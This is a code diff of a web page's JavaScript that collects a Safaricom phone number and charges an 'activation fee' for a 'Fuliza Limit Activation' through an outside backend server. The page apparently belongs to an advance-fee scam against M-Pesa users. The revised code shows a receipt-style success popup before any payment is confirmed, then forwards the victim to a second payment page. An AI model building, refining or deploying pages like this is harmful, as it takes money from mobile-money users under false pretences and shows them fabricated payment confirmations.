@@ -158,12 +158,12 @@ body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh
     </div>
   </div>
 </div>
-
 <script>
 const BACKEND = "https://mpayafrica-server.onrender.com";
 
 const selectedAmount = localStorage.getItem("selectedAmount") || "—";
 const activationFee  = localStorage.getItem("activationFee")  || "—";
+
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 document.getElementById("fee").innerText   = "KSh " + activationFee;
 
@@ -178,227 +178,174 @@ phoneInput.addEventListener("input", () => {
 });
 
 function validatePhoneUI(val) {
+
   if (val.length === 0) {
     phoneWrap.className = "phone-wrap";
     phoneStatus.innerText = "";
-    phoneHint.style.color = "#888";
     phoneHint.innerText = "Enter 9 digits after 254 — starts with 7 (07xx) or 1 (01xx)";
     return false;
   }
+
   if (val.length < 9) {
     phoneWrap.className = "phone-wrap";
     phoneStatus.innerText = "";
-    phoneHint.style.color = "#888";
-    phoneHint.innerText = `${9 - val.length} more digit${9 - val.length !== 1 ? "s" : ""} needed`;
+    phoneHint.innerText = `${9 - val.length} more digits needed`;
     return false;
   }
+
   if (!val.startsWith("7") && !val.startsWith("1")) {
     phoneWrap.className = "phone-wrap invalid";
     phoneStatus.innerText = "✗";
     phoneStatus.style.color = "#e74c3c";
     phoneHint.style.color = "#e74c3c";
-    phoneHint.innerText = "Must start with 7 or 1 — Safaricom numbers only (07xx / 01xx)";
+    phoneHint.innerText = "Number must start with 7 or 1";
     return false;
   }
+
   phoneWrap.className = "phone-wrap valid";
   phoneStatus.innerText = "✓";
   phoneStatus.style.color = "#1fb141";
   phoneHint.style.color = "#1fb141";
-  phoneHint.innerText = "Valid Safaricom number ✓";
+  phoneHint.innerText = "Valid Safaricom number";
   return true;
 }
 
-function showStatus(msg, type) {
-  const el = document.getElementById("statusMsg");
-  el.innerText = msg;
-  el.className = "status-msg " + type;
-  el.style.display = "block";
+function showStatus(msg,type){
+  const el=document.getElementById("statusMsg");
+  el.innerText=msg;
+  el.className="status-msg "+type;
+  el.style.display="block";
 }
 
-function hideStatus() {
-  document.getElementById("statusMsg").style.display = "none";
+function hideStatus(){
+  document.getElementById("statusMsg").style.display="none";
 }
 
-function setSpinner(show, text) {
-  const s = document.getElementById("spinner");
-  s.style.display = show ? "flex" : "none";
-  if (text) document.getElementById("spinnerText").innerText = text;
+function setSpinner(show,text){
+  const s=document.getElementById("spinner");
+  s.style.display=show?"flex":"none";
+  if(text) document.getElementById("spinnerText").innerText=text;
 }
 
-function setPayBtn(disabled) {
-  document.getElementById("payBtn").disabled = disabled;
+function setPayBtn(disabled){
+  document.getElementById("payBtn").disabled=disabled;
 }
 
-let pollInterval = null;
-let redirectTimer = null;
-let currentPhone = null;
-let currentAmount = null;
+let redirectTimer=null;
 
-async function payNow() {
-  const digits = phoneInput.value.trim();
-  if (!validatePhoneUI(digits)) {
-    showStatus("Please enter a valid Safaricom number (starts with 7 or 1, 9 digits after 254).", "error");
+async function payNow(){
+
+  const digits=phoneInput.value.trim();
+
+  if(!validatePhoneUI(digits)){
+    showStatus("Enter a valid Safaricom number.","error");
     return;
   }
 
-  const fullPhone = "254" + digits;
-  const amount = Number(activationFee) || 0;
-  if (!amount || amount <= 0) {
-    showStatus("No activation fee found. Please go back and select your limit.", "error");
+  const fullPhone="+254"+digits;
+  const amount=Number(activationFee)||0;
+
+  if(amount<=0){
+    showStatus("Invalid activation fee.","error");
     return;
   }
-
-  currentPhone = fullPhone;
-  currentAmount = amount;
 
   hideStatus();
-  setSpinner(true, "Sending STK Push to your phone…");
+  setSpinner(true,"Sending payment request…");
   setPayBtn(true);
 
-  let data;
-  try {
-    const res = await fetch(BACKEND + "/api/stk-push", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        amount,
-        phone_number: fullPhone,
-        user_reference: "Fuliza Limit Activation",
-        payment_id: "wallet",
-      }),
+  try{
+
+    const res=await fetch(BACKEND+"/deposit",{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({
+        phone_number:fullPhone,
+        amount:amount,
+        network:"MPESA"
+      })
     });
-    data = await res.json();
-  } catch (err) {
+
+    const data=await res.json();
+
     setSpinner(false);
     setPayBtn(false);
-    showStatus("Network error: Could not reach server. Check your connection and try again.", "error");
-    return;
-  }
 
-  if (!data.success) {
-    setSpinner(false);
-    setPayBtn(false);
-    showStatus((data.message || data.error || "Payment initiation failed. Please try again."), "error");
-    return;
-  }
-
-  const checkoutId = data.checkoutRequestId;
-  setSpinner(true, "STK Push sent ✅ Enter your M-Pesa PIN on your phone…");
-  showStatus("Check your phone and enter your M-Pesa PIN to complete payment.", "info");
-
-  if (!checkoutId) {
-    setSpinner(false);
-    setPayBtn(false);
-    showStatus("Payment sent but could not track status. Check your M-Pesa messages.", "info");
-    return;
-  }
-
-  startPolling(checkoutId, fullPhone);
-}
-
-function startPolling(checkoutId, phone) {
-  let attempts = 0;
-  const maxAttempts = 40;
-
-  clearInterval(pollInterval);
-  pollInterval = setInterval(async () => {
-    attempts++;
-
-    if (attempts === 10) {
-      setSpinner(true, "Still waiting for confirmation…");
-    }
-
-    if (attempts > maxAttempts) {
-      clearInterval(pollInterval);
-      pollInterval = null;
-      setSpinner(false);
-      setPayBtn(false);
-      hideStatus();
-      showFailurePopup("Payment timed out — no confirmation received. Please try again.");
+    if(!data.success){
+      showFailurePopup(data.message||"Payment request failed");
       return;
     }
 
-    try {
-      const res = await fetch(`${BACKEND}/receipt/${encodeURIComponent(checkoutId)}`);
-      const data = await res.json();
+    showSuccessPopup({
+      receiptNumber:data.reference,
+      amount:amount,
+      phone:fullPhone,
+      transactionDate:new Date().toLocaleString("en-KE"),
+      purpose:"Fuliza Limit Activation"
+    });
 
-      if (data.status === "pending" || data.status === "not_found") return;
+  }catch(err){
 
-      clearInterval(pollInterval);
-      pollInterval = null;
-      setSpinner(false);
-      setPayBtn(false);
-      hideStatus();
+    setSpinner(false);
+    setPayBtn(false);
 
-      if (data.status === "success" && data.receipt) {
-        showSuccessPopup(data.receipt, phone);
-      } else if (data.status === "failed") {
-        showFailurePopup(data.reason || "Payment was not completed. Please try again.");
-      }
-    } catch (_) {}
-  }, 3000);
+    showFailurePopup("Could not connect to payment server");
+
+  }
 }
 
-function showSuccessPopup(receipt, fallbackPhone) {
-  document.getElementById("rReceiptNo").innerText = receipt.receiptNumber || "N/A";
-  document.getElementById("rAmount").innerText    = "KSh " + (receipt.amount || activationFee);
-  document.getElementById("rPhone").innerText     = receipt.phone || fallbackPhone || "—";
-  document.getElementById("rDate").innerText      = receipt.transactionDate || new Date().toLocaleString("en-KE");
-  document.getElementById("rPurpose").innerText   = "Payment for: " + (receipt.purpose || "Fuliza Limit Activation");
+function showSuccessPopup(receipt){
 
-  const overlay = document.getElementById("successOverlay");
-  overlay.classList.add("show");
+  document.getElementById("rReceiptNo").innerText=receipt.receiptNumber;
+  document.getElementById("rAmount").innerText="KSh "+receipt.amount;
+  document.getElementById("rPhone").innerText=receipt.phone;
+  document.getElementById("rDate").innerText=receipt.transactionDate;
+  document.getElementById("rPurpose").innerText="Payment for: "+receipt.purpose;
+
+  document.getElementById("successOverlay").classList.add("show");
 
   startCountdown(10);
 }
 
-function startCountdown(seconds) {
+function startCountdown(seconds){
+
   clearTimeout(redirectTimer);
-  const total = seconds;
-  let remaining = seconds;
 
-  document.getElementById("countdownNum").innerText = remaining;
-  document.getElementById("progressFill").style.width = "100%";
+  let remaining=seconds;
 
-  const tick = () => {
+  document.getElementById("countdownNum").innerText=remaining;
+
+  const tick=()=>{
+
     remaining--;
-    document.getElementById("countdownNum").innerText = remaining;
-    const pct = (remaining / total) * 100;
-    document.getElementById("progressFill").style.width = pct + "%";
 
-    if (remaining <= 0) {
+    document.getElementById("countdownNum").innerText=remaining;
+
+    if(remaining<=0){
       goNext();
       return;
     }
-    redirectTimer = setTimeout(tick, 1000);
+
+    redirectTimer=setTimeout(tick,1000);
+
   };
 
-  redirectTimer = setTimeout(tick, 1000);
+  redirectTimer=setTimeout(tick,1000);
 }
 
-function goNext() {
-  clearTimeout(redirectTimer);
-  window.location.href = "payment2.html";
+function goNext(){
+  window.location.href="payment2.html";
 }
 
-function showFailurePopup(reason) {
-  document.getElementById("failureReason").innerText = reason || "Payment failed. Please try again.";
+function showFailurePopup(reason){
+  document.getElementById("failureReason").innerText=reason;
   document.getElementById("failureOverlay").classList.add("show");
 }
 
-function retryPayment() {
+function retryPayment(){
   document.getElementById("failureOverlay").classList.remove("show");
-  clearInterval(pollInterval);
-  pollInterval = null;
-  clearTimeout(redirectTimer);
-  hideStatus();
-  setPayBtn(false);
-  setSpinner(false);
-  const digits = phoneInput.value.trim();
-  if (validatePhoneUI(digits)) {
-    payNow();
-  }
 }
 </script>
+
 </body>
 </html>
